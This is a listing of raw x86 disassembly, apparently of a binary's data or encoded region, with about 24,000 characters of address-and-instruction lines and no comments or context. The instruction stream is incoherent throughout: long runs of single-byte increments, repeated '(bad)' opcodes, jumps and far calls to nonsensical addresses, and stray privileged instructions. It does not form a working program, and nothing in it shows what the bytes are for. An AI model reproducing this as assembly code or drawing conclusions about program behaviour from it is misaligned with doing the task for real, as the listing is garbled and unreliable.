  417251:	inc    eax
  417252:	inc    eax
  417253:	inc    eax
  417254:	int3   
  417255:	jne    0x417297
  417257:	jo     0x4171f9
  417259:	mov    ebx,0x1ac02740
  41725e:	pop    edi
  41725f:	imul   ecx,DWORD PTR ds:0x624d24ce,0x7b497c8b
  417269:	ins    DWORD PTR es:[edi],dx
  41726a:	ins    BYTE PTR es:[edi],dx
  41726b:	push   ebx
  41726c:	dec    esp
  41726d:	bound  eax,QWORD PTR [eax+0x0]
  417270:	rol    DWORD PTR [eax+0x40],0x40
  417274:	inc    eax
  417275:	add    BYTE PTR [eax+0x56],al
  417278:	cmp    BYTE PTR [eax-0x3fae6324],0x7
  41727f:	push   edi
  417280:	push   esp
  417281:	or     eax,0xedd34373
  417286:	jg     0x41721c
  417288:	dec    ecx
  417289:	retf   
  41728a:	(bad)  
  41728b:	lds    ebp,FWORD PTR [edi+0xe]
  41728e:	loop   0x4172e3
  417290:	popf   
  417291:	inc    esp
  417292:	scas   eax,DWORD PTR es:[edi]
  417293:	xchg   esi,eax
  417294:	jae    0x4172db
  417296:	inc    eax
  417297:	inc    eax
  417298:	inc    eax
  417299:	inc    eax
  41729a:	inc    eax
  41729b:	inc    eax
  41729c:	inc    eax
  41729d:	inc    eax
  41729e:	inc    DWORD PTR [eax-0x2f]
  4172a1:	push   esi
  4172a2:	inc    sp
  4172a4:	test   eax,0x6ac05883
  4172a9:	loopne 0x4172df
  4172ab:	xchg   ebx,eax
  4172ac:	lods   al,BYTE PTR ds:[esi]
  4172ad:	cmp    dh,BYTE PTR [ebx+0x62faa201]
  4172b3:	inc    eax
  4172b4:	inc    eax
  4172b5:	inc    eax
  4172b6:	inc    eax
  4172b7:	inc    eax
  4172b8:	inc    eax
  4172b9:	inc    eax
  4172ba:	inc    eax
  4172bb:	inc    eax
  4172bc:	inc    eax
  4172bd:	rcr    BYTE PTR [eax+0x58],0x5a
  4172c1:	inc    eax
  4172c2:	push   es
  4172c3:	xchg   edi,eax
  4172c4:	lds    edx,FWORD PTR [ebx-0x41]
  4172c7:	sub    BYTE PTR [edx-0x5bbac5f3],bh
  4172cd:	sub    BYTE PTR [ebp+0x1c],0x9f
  4172d1:	inc    eax
  4172d2:	mov    eax,ds:0x34666362
  4172d7:	inc    ebx
  4172d8:	mov    ecx,0x4040401f
  4172dd:	inc    eax
  4172de:	inc    eax
  4172df:	inc    eax
  4172e0:	inc    eax
  4172e1:	inc    eax
  4172e2:	add    BYTE PTR [ecx-0x33],al
  4172e5:	dec    edx
  4172e6:	cmp    eax,0x44404405
  4172eb:	mov    dl,0x56
  4172ed:	mov    al,ds:0x294c3d66
  4172f2:	shr    BYTE PTR [eax],0xf9
  4172f5:	jo     0x4172a6
  4172f7:	ja     0x417364
  4172f9:	pusha  
  4172fa:	add    DWORD PTR [esi-0x739998a9],edx
  417300:	mov    dl,0x40
  417302:	inc    eax
  417303:	inc    eax
  417304:	inc    eax
  417305:	inc    eax
  417306:	inc    eax
  417307:	and    eax,0x7b404040
  41730c:	add    esi,DWORD PTR [ecx]
  41730e:	xchg   esp,eax
  41730f:	std    
  417310:	cmp    eax,0x40c1b61c
  417315:	ja     0x41736b
  417317:	arpl   WORD PTR [eax+0x40],ax
  41731a:	inc    eax
  41731b:	inc    eax
  41731c:	inc    eax
  41731d:	inc    eax
  41731e:	inc    eax
  41731f:	inc    eax
  417320:	inc    eax
  417321:	inc    eax
  417322:	outs   dx,BYTE PTR ds:[esi]
  417323:	add    eax,0x6b099543
  417328:	inc    edi
  417329:	xor    BYTE PTR [ebp+ebx*8+0x3f404ac6],bh
  417330:	inc    eax
  417331:	inc    eax
  417332:	inc    eax
  417333:	inc    eax
  417334:	inc    eax
  417335:	inc    eax
  417336:	rol    DWORD PTR [eax+0x40],0xec
  41733a:	mov    eax,0xd51ee866
  41733f:	push   ss
  417340:	pop    edx
  417341:	push   edi
  417342:	bound  edi,QWORD PTR ds:0x405b30a0
  417348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417349:	xchg   esp,eax
  41734a:	jge    0x4173b3
  41734c:	test   al,0xc8
  41734e:	repz adc dl,BYTE PTR [edx+0x43cbc054]
  417355:	inc    eax
  417356:	inc    eax
  417357:	add    BYTE PTR [eax+0x40],al
  41735a:	inc    eax
  41735b:	inc    eax
  41735c:	inc    eax
  41735d:	inc    eax
  41735e:	lods   eax,DWORD PTR ds:[esi]
  41735f:	dec    esi
  417360:	inc    eax
  417361:	add    BYTE PTR [edi+0x63],ah
  417364:	mov    esp,0x40742821
  417369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41736a:	call   0x18a9894e
  41736f:	pop    edi
  417370:	add    eax,0xe148575b
  417375:	adc    BYTE PTR [ebx+0x10],al
  417378:	inc    eax
  417379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41737a:	xchg   esp,eax
  41737b:	(bad)
  41737e:	inc    eax
  41737f:	imul   edx,DWORD PTR [ebx],0x40
  417382:	inc    eax
  417383:	inc    eax
  417384:	inc    eax
  417385:	inc    eax
  417386:	inc    eax
  417387:	inc    eax
  417388:	inc    eax
  417389:	inc    eax
  41738a:	inc    eax
  41738b:	icebp  
  41738c:	push   ebp
  41738d:	jne    0x4173f1
  41738f:	ds and al,0x7b
  417392:	inc    eax
  417393:	push   ebx
  417394:	push   eax
  417395:	nop
  417396:	mov    edi,0x40506cc0
  41739b:	inc    eax
  41739c:	inc    eax
  41739d:	inc    eax
  41739e:	inc    eax
  41739f:	inc    eax
  4173a0:	int3   
  4173a1:	jne    0x4173e3
  4173a3:	gs jecxz 0x417412
  4173a6:	bound  edi,QWORD PTR [edi-0x12caf58]
  4173ac:	sbb    eax,0x117a5ff0
  4173b1:	inc    ebx
  4173b2:	and    al,al
  4173b4:	xchg   BYTE PTR [edi+0x34],dl
  4173b7:	test   eax,0x40c10040
  4173bc:	inc    eax
  4173bd:	inc    eax
  4173be:	inc    eax
  4173bf:	add    BYTE PTR [eax+0x58],al
  4173c2:	lds    edx,FWORD PTR [ebx-0x7f6bba83]
  4173c8:	xchg   ecx,eax
  4173c9:	or     BYTE PTR [edx+0x544aee41],ah
  4173cf:	lds    edi,FWORD PTR [edi-0x3faed235]
  4173d5:	pop    ebp
  4173d6:	push   esp
  4173d7:	inc    esp
  4173d8:	dec    eax
  4173d9:	inc    eax
  4173da:	and    BYTE PTR [eax+0x45],cl
  4173dd:	lods   eax,DWORD PTR ds:[esi]
  4173de:	lock test BYTE PTR [eax+0x40],al
  4173e2:	inc    eax
  4173e3:	inc    eax
  4173e4:	inc    eax
  4173e5:	inc    eax
  4173e6:	inc    eax
  4173e7:	inc    eax
  4173e8:	inc    DWORD PTR [eax+0x44]
  4173eb:	inc    eax
  4173ec:	sbb    dh,BYTE PTR [edi]
  4173ee:	and    eax,0x4343570b
  4173f3:	ret    0x7728
  4173f6:	push   edx
  4173f7:	pop    ecx
  4173f8:	xchg   esp,eax
  4173f9:	hlt    
  4173fa:	sub    cl,bh
  4173fc:	adc    al,0x73
  4173fe:	rcr    edi,0x54
  417401:	and    BYTE PTR [esi-0x58],dl
  417404:	inc    ebx
  417405:	push   esi
  417406:	inc    eax
  417407:	inc    eax
  417408:	inc    eax
  417409:	inc    eax
  41740a:	inc    eax
  41740b:	inc    eax
  41740c:	inc    eax
  41740d:	inc    eax
  41740e:	inc    eax
  41740f:	inc    eax
  417410:	xchg   BYTE PTR gs:[ebp-0x3d],ah
  417414:	inc    ax
  417416:	inc    eax
  417417:	repnz sar edi,0x8c
  41741b:	test   al,0x29
  41741d:	sub    ah,BYTE PTR [edi+edi*1]
  417420:	inc    esp
  417421:	or     ecx,DWORD PTR [ebx+0x6c106375]
  417427:	test   eax,0x404040c0
  41742c:	inc    eax
  41742d:	inc    eax
  41742e:	inc    eax
  41742f:	inc    eax
  417430:	inc    eax
  417431:	add    BYTE PTR [eax],al
  417433:	mov    eax,0x6a9c40e2
  417438:	pop    eax
  417439:	outs   dx,BYTE PTR ds:[esi]
  41743a:	shl    DWORD PTR [edx+0x62],1
  41743d:	cmp    BYTE PTR ds:0x2b8b5146,al
  417443:	push   esp
  417444:	dec    ebx
  417445:	ins    DWORD PTR es:[edi],dx
  417446:	retf   
  417447:	int    0x46
  417449:	rol    BYTE PTR [esi-0x50],0x9c
  41744d:	xor    al,0x92
  41744f:	cwde   
  417450:	xor    edi,DWORD PTR [esi+0x40]
  417453:	inc    eax
  417454:	inc    eax
  417455:	inc    eax
  417456:	inc    eax
  417457:	inc    eax
  417458:	and    eax,0xa7404040
  41745d:	fisubr WORD PTR [ecx+0x43]
  417460:	mov    edi,0x8a144993
  417465:	push   esp
  417466:	mov    esp,0x71df50d9
  41746b:	shr    BYTE PTR [edx+0x42716dd1],0x49
  417472:	pop    ecx
  417473:	xor    eax,0x4334dce4
  417478:	inc    eax
  417479:	sub    BYTE PTR [eax+0x40],al
  41747c:	inc    eax
  41747d:	inc    eax
  41747e:	inc    eax
  41747f:	inc    eax
  417480:	inc    eax
  417481:	inc    eax
  417482:	inc    eax
  417483:	inc    eax
  417484:	fdivr  DWORD PTR [ecx+eiz*8+0x54]
  417488:	je     0x417423
  41748a:	inc    ecx
  41748b:	adc    BYTE PTR ds:0x69b146e7,dh
  417491:	pop    ebp
  417492:	xor    BYTE PTR [ebx+0x73],al
  417495:	sar    cl,1
  417497:	fcmove st,st(3)
  417499:	stos   DWORD PTR es:[edi],eax
  41749a:	fadd   DWORD PTR [eax+0x40]
  41749d:	inc    eax
  41749e:	inc    eax
  41749f:	inc    eax
  4174a0:	inc    eax
  4174a1:	rol    DWORD PTR [eax+0x40],0x40
  4174a5:	xchg   ebp,eax
  4174a6:	xor    bl,BYTE PTR [edi-0x57d9bb9b]
  4174ac:	and    al,0x1f
  4174ae:	in     al,dx
  4174af:	das    
  4174b0:	loope  0x4174f3
  4174b2:	dec    esi
  4174b3:	adc    DWORD PTR [ebx+esi*4-0x40],ebp
  4174b7:	fadd   DWORD PTR [edx]
  4174b9:	cmp    dl,BYTE PTR [ebp-0x54]
  4174bc:	add    al,0x3b
  4174be:	jl     0x417537
  4174c0:	cli    
  4174c1:	fst    DWORD PTR ds:0xdb386a41
  4174c7:	dec    eax
  4174c8:	inc    eax
  4174c9:	inc    eax
  4174ca:	add    BYTE PTR [eax+0x40],al
  4174cd:	inc    eax
  4174ce:	inc    eax
  4174cf:	inc    eax
  4174d0:	inc    eax
  4174d1:	fadd   st,st(1)
  4174d3:	retf   
  4174d4:	cmp    esp,ebp
  4174d6:	push   ebx
  4174d7:	into   
  4174d8:	jl     0x417538
  4174da:	popa   
  4174db:	dec    ecx
  4174dc:	sub    BYTE PTR ds:0x4040405c,ch
  4174e2:	inc    eax
  4174e3:	inc    eax
  4174e4:	inc    eax
  4174e5:	inc    eax
  4174e6:	inc    eax
  4174e7:	inc    eax
  4174e8:	inc    eax
  4174e9:	jp     0x4174fa
  4174eb:	mov    bh,0xae
  4174ed:	les    eax,FWORD PTR [eax+0x6c]
  4174f0:	mov    bl,0xa
  4174f2:	(bad)  
  4174f4:	arpl   bx,cx
  4174f6:	dec    ecx
  4174f7:	pop    ebx
  4174f8:	dec    esi
  4174f9:	rcl    DWORD PTR [ebx+0x4038b405],1
  4174ff:	inc    eax
  417500:	inc    eax
  417501:	inc    eax
  417502:	inc    eax
  417503:	inc    eax
  417504:	int3   
  417505:	jne    0x417547
  417507:	xor    eax,0x37157128
  41750c:	mov    ds:0xce50805,al
  417511:	inc    edx
  417512:	je     0x417510
  417514:	(bad)  
  417515:	leave  
  417516:	inc    ebx
  417517:	and    al,0x42
  417519:	xchg   ecx,eax
  41751a:	shl    eax,0x64
  41751d:	dec    esp
  41751e:	es sub eax,0xf5314540
  417524:	clc    
  417525:	inc    ecx
  417526:	adc    BYTE PTR [ebx+0x24],ah
  417529:	rol    ecx,1
  41752b:	jo     0x417501
  41752d:	jb     0x41756f
  41752f:	add    cl,al
  417531:	inc    eax
  417532:	inc    eax
  417533:	inc    eax
  417534:	inc    eax
  417535:	add    BYTE PTR [eax-0x58],al
  417538:	shr    BYTE PTR [edx+ecx*2+0x7f],0x5c
  41753d:	cmp    DWORD PTR [eax+edx*1],0xc0311eb0
  417544:	(bad)  
  417545:	scas   al,BYTE PTR es:[edi]
  417546:	ds mov al,0x64
  417549:	inc    ebx
  41754a:	push   esi
  41754b:	sub    DWORD PTR [edx],edi
  41754d:	shl    BYTE PTR [eax],cl
  41754f:	inc    ecx
  417550:	rol    DWORD PTR [eax+0x40],1
  417553:	inc    eax
  417554:	inc    eax
  417555:	inc    eax
  417556:	inc    eax
  417557:	inc    eax
  417558:	inc    eax
  417559:	inc    DWORD PTR [eax-0x3b]
  41755c:	xor    ecx,DWORD PTR [edi-0x74]
  41755f:	imul   ebp,DWORD PTR [eax+0x5bb7a8e4],0xffffffc3
  417566:	cmp    BYTE PTR [ebp+0x62],dh
  417569:	dec    esp
  41756a:	adc    DWORD PTR ds:0x564200d3,esi
  417570:	(bad)  
  417571:	bound  edi,QWORD PTR [eax+0x40404040]
  417577:	inc    eax
  417578:	inc    eax
  417579:	inc    eax
  41757a:	inc    eax
  41757b:	inc    eax
  41757c:	inc    eax
  41757d:	mov    ebx,0xd074c1bf
  417582:	fs pop edi
  417584:	inc    ecx
  417585:	xchg   DWORD PTR [ebx+0x7c],edi
  417588:	mov    eax,DWORD PTR ds:0x283b3405
  41758e:	jmp    0x4081b653
  417593:	inc    eax
  417594:	inc    eax
  417595:	inc    eax
  417596:	inc    eax
  417597:	inc    eax
  417598:	add    BYTE PTR [ebp+0x2832cb55],ah
  41759e:	or     BYTE PTR [eax+0x31],ah
  4175a1:	cmp    eax,0x65226202
  4175a6:	inc    ebx
  4175a7:	scas   al,BYTE PTR es:[di]
  4175a9:	jle    0x4175ff
  4175ab:	push   ss
  4175ac:	(bad)  
  4175ae:	inc    eax
  4175af:	adc    BYTE PTR [ecx],0x40
  4175b2:	inc    eax
  4175b3:	inc    eax
  4175b4:	inc    eax
  4175b5:	inc    eax
  4175b6:	inc    eax
  4175b7:	and    eax,0x76404040
  4175bc:	clc    
  4175bd:	bound  esp,QWORD PTR [edi+0x63]
  4175c0:	and    al,0x67
  4175c2:	int    0xc4
  4175c4:	into   
  4175c5:	arpl   WORD PTR [ecx+0x3b],ax
  4175c8:	ins    BYTE PTR es:[edi],dx
  4175c9:	xchg   ebx,eax
  4175ca:	jg     0x4175bb
  4175cc:	mov    bh,0x56
  4175ce:	sub    BYTE PTR fs:[eax],bh
  4175d1:	stos   DWORD PTR es:[edi],eax
  4175d2:	sar    ebp,0x1a
  4175d5:	sub    DWORD PTR [ebp+0x4e4c43b4],ecx
  4175db:	stos   DWORD PTR es:[edi],eax
  4175dc:	inc    ax
  4175de:	inc    eax
  4175df:	inc    eax
  4175e0:	inc    eax
  4175e1:	inc    eax
  4175e2:	inc    eax
  4175e3:	inc    eax
  4175e4:	inc    eax
  4175e5:	inc    eax
  4175e6:	inc    eax
  4175e7:	sbb    eax,0x63c50534
  4175ec:	shl    DWORD PTR [ebx+0x6134e0cc],0xd0
  4175f3:	pop    ecx
  4175f4:	inc    esi
  4175f5:	call   0xca6bd94b
  4175fa:	inc    edx
  4175fb:	and    esp,eax
  4175fd:	int    0x85
  4175ff:	clc    
  417600:	test   al,0x62
  417602:	adc    DWORD PTR [edx+0x40],esi
  417605:	inc    eax
  417606:	inc    eax
  417607:	inc    eax
  417608:	inc    eax
  417609:	inc    eax
  41760a:	rol    DWORD PTR [eax+0x40],0x29
  41760e:	cmp    eax,0x487b6258
  417613:	aaa    
  417614:	mov    eax,ds:0xfd74431d
  417619:	aaa    
  41761a:	(bad)  [eax]
  41761c:	lods   al,BYTE PTR ds:[esi]
  41761d:	shl    DWORD PTR [edi+0x40],0x40
  417621:	add    BYTE PTR [eax+0x40],al
  417624:	inc    eax
  417625:	inc    eax
  417626:	inc    eax
  417627:	inc    eax
  417628:	inc    edx
  417629:	bound  bp,DWORD PTR [ecx+0x4]
  41762d:	jecxz  0x41769f
  41762f:	loope  0x417681
  417631:	add    BYTE PTR [edx+0x65],0x43
  417635:	mov    edi,0x345164c6
  41763a:	sub    bh,BYTE PTR [eax-0x4adb9bc0]
  417640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417641:	bound  edx,QWORD PTR [eax]
  417643:	das    
  417644:	and    al,0x23
  417646:	mov    dh,0x59
  417648:	(bad)  
  417649:	cwde   
  41764a:	inc    eax
  41764b:	inc    eax
  41764c:	inc    eax
  41764d:	inc    eax
  41764e:	inc    eax
  41764f:	inc    eax
  417650:	inc    eax
  417651:	inc    eax
  417652:	inc    eax
  417653:	inc    eax
  417654:	mov    BYTE PTR [ecx+0x6c],al
  417657:	iret   
  417658:	dec    esi
  417659:	add    DWORD PTR [edx+0x62],ecx
  41765c:	inc    ecx
  41765d:	arpl   dx,dx
  41765f:	and    eax,eax
  417661:	out    0xad,eax
  417663:	pusha  
  417664:	addr16 dec eax
  417666:	inc    ebx
  417667:	fisub  WORD PTR [ebx]
  417669:	cmp    al,ah
  41766b:	inc    esp
  41766c:	dec    esp
  41766d:	test   ebp,0x51de42ef
  417673:	gs push 0xc0646bd5
  417679:	mov    al,0x40
  41767b:	inc    eax
  41767c:	inc    eax
  41767d:	inc    eax
  41767e:	inc    eax
  41767f:	inc    eax
  417680:	int3   
  417681:	jne    0x4176c3
  417683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417684:	xor    bh,BYTE PTR [edx+0x65]
  417687:	mov    eax,ds:0xc2b024a5
  41768c:	cld    
  41768d:	sub    al,0x35
  41768f:	pop    ebp
  417690:	push   esi
  417691:	add    dl,BYTE PTR [edi+0x51]
  417694:	data16 mov al,ds:0xc4625c55
  41769a:	stos   DWORD PTR es:[edi],eax
  41769b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41769c:	imul   eax,DWORD PTR [ecx+0x403228da],0x4040c100
  4176a6:	inc    eax
  4176a7:	inc    eax
  4176a8:	add    BYTE PTR [eax+0x2e],al
  4176ab:	stos   BYTE PTR es:[edi],al
  4176ac:	sar    BYTE PTR [esp+esi*4+0x586e0015],0x8d
  4176b4:	or     eax,0x43c90563
  4176b9:	popa   
  4176ba:	sar    dh,0x60
  4176bd:	inc    eax
  4176be:	inc    eax
  4176bf:	inc    eax
  4176c0:	inc    eax
  4176c1:	inc    eax
  4176c2:	inc    eax
  4176c3:	inc    eax
  4176c4:	inc    eax
  4176c5:	inc    DWORD PTR [eax+0x6d]
  4176c8:	retf   
  4176c9:	mov    al,ds:0x7d346340
  4176ce:	repnz enter 0x1542,0x24
  4176d3:	mov    eax,ds:0x6c58b4ea
  4176d8:	(bad)  
  4176d9:	retf   
  4176da:	ins    BYTE PTR es:[edi],dx
  4176db:	mov    ebx,0x4040fe71
  4176e0:	inc    eax
  4176e1:	inc    eax
  4176e2:	inc    eax
  4176e3:	inc    eax
  4176e4:	inc    eax
  4176e5:	inc    eax
  4176e6:	inc    eax
  4176e7:	inc    eax
  4176e8:	je     0x41767a
  4176ea:	mov    al,ds:0xc20eec42
  4176ef:	push   esi
  4176f0:	push   esp
  4176f1:	ins    DWORD PTR es:[edi],dx
  4176f2:	inc    esp
  4176f3:	push   ebp
  4176f4:	inc    ebx
  4176f5:	in     al,0x60
  4176f7:	inc    eax
  4176f8:	inc    eax
  4176f9:	inc    eax
  4176fa:	inc    eax
  4176fb:	inc    eax
  4176fc:	inc    eax
  4176fd:	inc    eax
  4176fe:	inc    eax
  4176ff:	add    al,al
  417701:	cdq    
  417702:	leave  
  417703:	push   eax
  417704:	rol    ch,0x2c
  417707:	dec    ecx
  417708:	in     eax,0x98
  41770a:	xchg   DWORD PTR fs:[edi+esi*1],eax
  41770e:	dec    edx
  41770f:	rcr    BYTE PTR ds:0xde4c9064,0xe7
  417716:	loope  0x417742
  417718:	pop    edx
  417719:	test   BYTE PTR [ebx],al
  41771b:	in     eax,dx
  41771c:	sub    eax,0xf3407a9a
  417721:	sbb    cl,bh
  417723:	push   ebp
  417724:	clc    
  417725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417726:	inc    eax
  417727:	inc    eax
  417728:	inc    eax
  417729:	inc    eax
  41772a:	inc    eax
  41772b:	inc    eax
  41772c:	and    eax,0xa3404040
  417731:	and    DWORD PTR [ebx-0x4c299d9e],ebx
  417737:	sub    BYTE PTR [ecx+0x2],ah
  41773a:	adc    eax,0xa828223c
  41773f:	jl     0x417781
  417741:	inc    eax
  417742:	inc    eax
  417743:	inc    eax
  417744:	inc    eax
  417745:	inc    eax
  417746:	inc    eax
  417747:	inc    eax
  417748:	inc    eax
  417749:	inc    eax
  41774a:	mov    ds:0x9cd540c0,eax
  41774f:	pop    esp
  417750:	inc    esp
  417751:	inc    ebx
  417752:	inc    edx
  417753:	and    ebp,ebx
  417755:	push   eax
  417756:	bound  ebx,QWORD PTR [ebx+esi*1+0x40]
  41775a:	and    edx,esp
  41775c:	fwait
  41775d:	out    dx,al
  41775e:	or     DWORD PTR [esi+0x7b],eax
  417761:	and    al,0x34
  417763:	pop    es
  417764:	(bad)  
  417766:	dec    eax
  417767:	push   eax
  417768:	cld    
  417769:	ins    BYTE PTR es:[edi],dx
  41776a:	daa    
  41776b:	ror    esp,0xfc
  41776e:	inc    eax
  41776f:	inc    eax
  417770:	inc    eax
  417771:	inc    eax
  417772:	inc    eax
  417773:	inc    eax
  417774:	rol    DWORD PTR [eax+0x40],0x65
  417778:	jp     0x4177dd
  41777a:	xchg   BYTE PTR [eax+0x48e90e77],bl
  417780:	fdiv   QWORD PTR ds:0xe7c06743
  417786:	into   
  417787:	inc    eax
  417788:	inc    eax
  417789:	add    BYTE PTR [eax+0x40],al
  41778c:	inc    eax
  41778d:	inc    eax
  41778e:	inc    eax
  41778f:	inc    eax
  417790:	or     DWORD PTR [ebp+0x13],esp
  417793:	(bad)  
  417796:	cs cli 
  417798:	dec    ecx
  417799:	gs add edi,ebx
  41779c:	adc    DWORD PTR [ebp+0x30],ebx
  41779f:	push   eax
  4177a0:	gs je  0x417805
  4177a3:	add    eax,0xad43c26b
  4177a8:	add    eax,0x9668bc63
  4177ad:	xor    edi,DWORD PTR [ebx+0x3deecbf8]
  4177b3:	jge    0x4177db
  4177b5:	je     0x41779e
  4177b7:	inc    eax
  4177b8:	inc    eax
  4177b9:	inc    eax
  4177ba:	inc    eax
  4177bb:	inc    eax
  4177bc:	inc    eax
  4177bd:	inc    eax
  4177be:	inc    eax
  4177bf:	inc    eax
  4177c0:	inc    eax
  4177c1:	imul   edi,DWORD PTR [esp+eiz*8-0x3decd73f],0x29694d45
  4177cc:	jp     0x417846
  4177ce:	outs   dx,DWORD PTR ds:[esi]
  4177cf:	xor    BYTE PTR [edx+0x56],dl
  4177d2:	xchg   DWORD PTR [eax-0x21],esi
  4177d5:	inc    eax
  4177d6:	inc    eax
  4177d7:	inc    eax
  4177d8:	inc    eax
  4177d9:	inc    eax
  4177da:	inc    eax
  4177db:	int3   
  4177dc:	jne    0x41781e
  4177de:	inc    ebx
  4177df:	fs js  0x4177ac
  4177e2:	mul    BYTE PTR [edx-0x2a]
  4177e5:	push   ebp
  4177e6:	inc    eax
  4177e7:	and    eax,0x634656c1
  4177ec:	nop
  4177ed:	sub    al,0x24
  4177ef:	adc    BYTE PTR [ebp+0x627bb52e],0xd0
  4177f6:	ins    BYTE PTR es:[edi],dx
  4177f7:	out    dx,eax
  4177f8:	adc    DWORD PTR [eax],esp
  4177fa:	hlt    
  4177fb:	ins    DWORD PTR es:[edi],dx
  4177fc:	cmp    al,0x44
  4177fe:	mov    al,ds:0x5804259
  417803:	arpl   WORD PTR [eax+0x0],ax
  417806:	rol    DWORD PTR [eax+0x40],0x40
  41780a:	inc    eax
  41780b:	add    BYTE PTR [eax-0x6c],al
  41780e:	cmp    eax,0x9327a343
  417813:	mov    ds:0xc554a069,al
  417818:	jb     0x41785a
  41781a:	inc    ecx
  41781b:	ror    BYTE PTR [eax+eax*2+0x40],cl
  41781f:	inc    eax
  417820:	inc    eax
  417821:	inc    eax
  417822:	inc    eax
  417823:	inc    eax
  417824:	inc    eax
  417825:	inc    DWORD PTR [eax+0x15]
  417828:	test   al,0xe7
  41782a:	loope  0x4177cd
  41782c:	adc    esp,DWORD PTR [ebp+eax*8-0x37]
  417830:	adc    ebx,eax
  417832:	xchg   edi,eax
  417833:	sub    eax,0x443df824
  417838:	lods   al,BYTE PTR ds:[esi]
  417839:	leave  
  41783a:	push   edx
  41783b:	inc    edx
  41783c:	div    edx
  41783e:	pushf  
  41783f:	inc    ecx
  417840:	inc    ecx
  417841:	add    al,0xe1
  417843:	inc    eax
  417844:	inc    eax
  417845:	inc    eax
  417846:	inc    eax
  417847:	inc    eax
  417848:	inc    eax
  417849:	inc    eax
  41784a:	inc    eax
  41784b:	inc    eax
  41784c:	inc    eax
  41784d:	xor    eax,0xed65b52c
  417852:	add    eax,0x66494228
  417857:	shr    BYTE PTR [edi],cl
  417859:	and    BYTE PTR [eax+0x74],dh
  41785c:	popa   
  41785d:	inc    eax
  41785e:	ds inc eax
  417860:	inc    eax
  417861:	inc    eax
  417862:	inc    eax
  417863:	inc    eax
  417864:	inc    eax
  417865:	inc    eax
  417866:	inc    eax
  417867:	add    BYTE PTR [esi-0x58],ah
  41786a:	bound  esp,QWORD PTR [ebx+eax*2+0x74]
  41786e:	pusha  
  41786f:	retf   0x65f0
  417872:	adc    bl,BYTE PTR [edi+0x59]
  417875:	mov    ds:0x1a0d43ca,eax
  41787a:	lock and al,0x9c
  41787d:	je     0x417892
  41787f:	push   ebp
  417880:	push   esp
  417881:	mov    esp,0xbf5d1262
  417886:	inc    ecx
  417887:	call   0x4040:0x40404040
  41788e:	and    eax,0x62404040
  417893:	arpl   WORD PTR [edx-0x751b60],bx
  417899:	scas   al,BYTE PTR es:[edi]
  41789a:	push   esp
  41789b:	jo     0x417862
  41789d:	adc    eax,0x4841a5b3
  4178a2:	stc    
  4178a3:	or     BYTE PTR [edi-0x33],0xba
  4178a7:	jne    0x417912
  4178a9:	(bad)
  4178ac:	arpl   WORD PTR [ecx+0x43],ax
  4178af:	jg     0x4178f1
  4178b1:	inc    eax
  4178b2:	inc    eax
  4178b3:	inc    eax
  4178b4:	inc    eax
  4178b5:	inc    eax
  4178b6:	inc    eax
  4178b7:	inc    eax
  4178b8:	inc    eax
  4178b9:	inc    eax
  4178ba:	inc    eax
  4178bb:	dec    edi
  4178bc:	push   esi
  4178bd:	out    0xe7,al
  4178bf:	cwde   
  4178c0:	(bad)  
  4178c1:	in     eax,0x36
  4178c3:	or     BYTE PTR [esi+0x37],0xd9
  4178c7:	cmp    BYTE PTR [edi],dl
  4178c9:	in     eax,0x77
  4178cb:	cs push esi
  4178cd:	rcl    BYTE PTR [ecx+esi*1-0x56bb1e4f],0xec
  4178d5:	inc    esp
  4178d6:	bound  edi,QWORD PTR [eax]
  4178d8:	cmp    esp,DWORD PTR [ebx+0x34]
  4178db:	and    edx,DWORD PTR ds:0x4040bac5
  4178e1:	inc    eax
  4178e2:	inc    eax
  4178e3:	inc    eax
  4178e4:	inc    eax
  4178e5:	rol    DWORD PTR [eax+0x40],0x12
  4178e9:	sub    edi,DWORD PTR [edi+0x3d9dd257]
  4178ef:	fcom   QWORD PTR [eax+0x40c828]
  4178f5:	mov    ds:0x40004040,al
  4178fa:	inc    eax
  4178fb:	inc    eax
  4178fc:	inc    eax
  4178fd:	inc    eax
  4178fe:	inc    eax
  4178ff:	test   al,0xac
  417901:	jnp    0x417973
  417903:	mov    eax,ds:0x2c640432
  417908:	add    eax,0xaad9433e
  41790d:	sar    dl,cl
  41790f:	ds retf 0x4091
  417913:	sub    DWORD PTR [ebp-0x26],eax
  417916:	jmp    0x4040:0x40bf0265
  41791d:	inc    eax
  41791e:	inc    eax
  41791f:	inc    eax
  417920:	inc    eax
  417921:	inc    eax
  417922:	inc    eax
  417923:	inc    eax
  417924:	and    al,0x7d
  417926:	inc    eax
  417927:	and    BYTE PTR ds:0x6c6c6276,cl
  41792d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41792e:	cs dec esi
  417930:	dec    edi
  417931:	add    al,0xcb
  417933:	dec    ebx
  417934:	push   esp
  417935:	inc    esi
  417936:	(bad)  
  417937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417938:	jmp    0x41799c
  41793a:	aam    0xdf
  41793c:	inc    ebx
  41793d:	popa   
  41793e:	inc    ecx
  41793f:	(bad)  
  417941:	inc    eax
  417942:	inc    eax
  417943:	inc    eax
  417944:	inc    eax
  417945:	inc    eax
  417946:	inc    eax
  417947:	int3   
  417948:	jne    0x41798a
  41794a:	leave  
  41794b:	bound  edi,QWORD PTR [ebp+eax*8+0x72]
  41794f:	inc    edi
  417950:	adc    al,0xe8
  417952:	es data16 test al,0x91
  417956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417957:	inc    edx
  417958:	add    BYTE PTR ds:0x110d0b8,0xe3
  41795f:	mov    eax,ds:0x640d9c1e
  417964:	nop
  417965:	out    dx,eax
  417966:	gs inc eax
  417968:	stos   BYTE PTR es:[edi],al
  417969:	or     eax,DWORD PTR [ecx+0x75]
  41796c:	inc    ecx
  41796d:	xchg   ebx,eax
  41796e:	push   0x40
  417970:	add    cl,al
  417972:	inc    eax
  417973:	inc    eax
  417974:	inc    eax
  417975:	inc    eax
  417976:	add    BYTE PTR [eax+0x2d],al
  417979:	es fs mov dh,0x80
  41797d:	aad    0x28
  41797f:	loope  0x4179dc
  417981:	clc    
  417982:	clc    
  417983:	xor    BYTE PTR [eax+ebp*1],dh
